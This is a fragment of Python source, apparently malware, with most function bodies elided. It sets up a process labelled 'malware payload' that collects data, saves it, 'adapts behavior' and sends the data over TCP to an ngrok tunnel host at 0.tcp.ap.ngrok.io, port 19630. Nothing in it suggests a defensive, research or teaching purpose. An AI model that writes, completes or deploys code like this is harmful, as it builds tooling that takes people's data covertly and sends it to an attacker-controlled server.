...
# Function to send collected data to a remote server over TCP
def send_data_over_tcp(data, server_ip, server_port):
    try:
...
def collect_all_data(callback=None):
    data = {}
...
def run_malware(callback=None):
    # Run the malware payload in a separate process
    collected_data = collect_all_data(callback)
    save_data_to_file(collected_data)
    adapt_behavior_and_execute_payload(collected_data)

if __name__ == "__main__":
    # Example callback function to send data over TCP after collection
    def send_callback(data):
        server_ip = "0.tcp.ap.ngrok.io"
        server_port = 19630
        send_data_over_tcp(data, server_ip, server_port)
    
    # Create a new process to run the malware payload with a callback
    malware_process = Process(target=run_malware, args=(send_callback,))
